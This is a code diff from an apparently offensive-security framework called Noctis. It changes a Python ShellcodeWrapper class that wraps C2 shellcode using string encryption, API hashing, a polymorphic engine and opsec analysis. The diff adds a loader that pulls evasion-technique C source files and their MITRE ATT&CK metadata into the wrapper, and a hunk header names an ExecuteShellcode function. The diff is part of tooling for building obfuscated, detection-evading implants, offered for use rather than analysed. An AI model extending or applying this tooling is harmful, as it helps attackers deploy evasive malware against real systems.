@@ -75,14 +75,14 @@ class ShellcodeWrapper:
     def __init__(self, config: WrapperConfig, verbose: bool = False):
         """
         Initialize shellcode wrapper
-        
+
         Args:
             config: Wrapper configuration
             verbose: Enable verbose logging
         """
         self.config = config
         self.verbose = verbose
-        
+
         # Initialize obfuscation engines
         self.string_encryptor = StringEncryptor()
         self.api_hasher = APIHasher()
@@ -90,9 +90,15 @@ class ShellcodeWrapper:
         self.polymorphic_engine = PolymorphicEngine()
         self.code_assembler = CodeAssembler()
         self.opsec_analyzer = OpsecAnalyzer()
-        
+
+        # Initialize TechniqueManager for loading techniques
+        from server.noctis_server import TechniqueManager
+        metadata_path = Path(__file__).parent.parent / 'techniques' / 'metadata'
+        self.technique_manager = TechniqueManager(str(metadata_path))
+
         if verbose:
             print("[*] ShellcodeWrapper initialized")
+            print(f"[*] Loaded {len(self.technique_manager.techniques)} techniques")
     
     def encrypt_shellcode(self, shellcode: bytes) -> Tuple[bytes, str]:
         """
@@ -415,17 +421,59 @@ BOOL ExecuteShellcode(unsigned char* shellcode, unsigned int len) {
     
     def _load_technique(self, technique_id: str) -> Optional[Dict[str, Any]]:
         """
-        Load technique implementation from metadata
-        
+        Load technique implementation from metadata using TechniqueManager
+
         Args:
-            technique_id: Noctis technique ID (e.g., 'NOCTIS-T124')
-            
+            technique_id: Noctis technique ID (e.g., 'NOCTIS-T004')
+
         Returns:
-            Technique metadata with implementation
+            Technique metadata with source code implementation
         """
-        # This would integrate with existing technique loader
-        # For now, return None
-        return None
+        try:
+            # Get technique metadata from TechniqueManager
+            metadata = self.technique_manager.get_by_id(technique_id)
+            if not metadata:
+                if self.verbose:
+                    print(f"[!] Technique not found: {technique_id}")
+                return None
+
+            # Load source code from files
+            examples_root = Path(__file__).parent.parent / 'Examples'
+            implementation_code = ""
+            loaded_files = []
+
+            # Load implementation from source files (limit to first 3 key files)
+            source_files = metadata.get('source_files', [])[:3]
+            for source_file in source_files:
+                # Convert Windows paths to Linux
+                file_path = examples_root / source_file.replace('\\', '/')
+
+                if file_path.exists() and file_path.suffix in ['.c', '.h']:
+                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                        content = f.read()
+                        implementation_code += f"// === {source_file} ===\n{content}\n\n"
+                        loaded_files.append(str(file_path))
+
+            if self.verbose:
+                print(f"[+] Loaded technique {technique_id}: {metadata.get('name')}")
+                print(f"[+] Files loaded: {len(loaded_files)}")
+
+            return {
+                'technique_id': technique_id,
+                'name': metadata.get('name'),
+                'description': metadata.get('description'),
+                'implementation': implementation_code,
+                'dependencies': metadata.get('dependencies', []),
+                'functions': metadata.get('code_blocks', {}).get('functions', []),
+                'mitre_attack': metadata.get('mitre_attack', []),
+                'opsec': metadata.get('opsec', {}),
+                'loaded_files': loaded_files
+            }
+
+        except Exception as e:
+            if self.verbose:
+                print(f"[!] Error loading technique {technique_id}: {e}")
+            return None
 
 
 def wrap_c2_shellcode(shellcode: bytes,
